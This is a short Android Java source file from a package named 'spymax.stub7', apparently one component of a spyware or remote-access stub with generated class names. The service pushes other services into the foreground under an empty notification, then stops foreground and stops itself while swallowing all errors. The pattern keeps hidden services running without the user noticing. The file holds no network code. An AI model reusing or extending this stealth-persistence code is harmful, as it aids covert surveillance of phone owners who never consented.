package spymax.stub7;
import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
public class ClassGen13 extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
      try{

          if (ClassGen3.sf0 == 1) {
              if(ClassGen11.st !=null){
                  _IDD = 500;
                  startForeground(ClassGen11.st);
              }
              ClassGen3.sf0 = 0;
          }else  if (ClassGen3.sf1 == 1) {
              if(ClassGen6.st !=null){
                  _IDD = 501;
                  startForeground(ClassGen6.st);
              }
              ClassGen3.sf1 = 0;
          }else  if (ClassGen3.sf2 == 1) {
              if(ClassGen5.st !=null){
                  _IDD = 502;
                  startForeground(ClassGen5.st);
              }
              ClassGen3.sf2 = 0;
          }

          startForeground(this);
          stopForeground(true);

      } catch (Exception e) {}
        stopSelf();
        return START_NOT_STICKY;
    }
    private static int _IDD = 10;
    private static void startForeground(Service service) {
        Notification notification = new Notification.Builder(service).getNotification();
        service.startForeground(_IDD, notification);
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}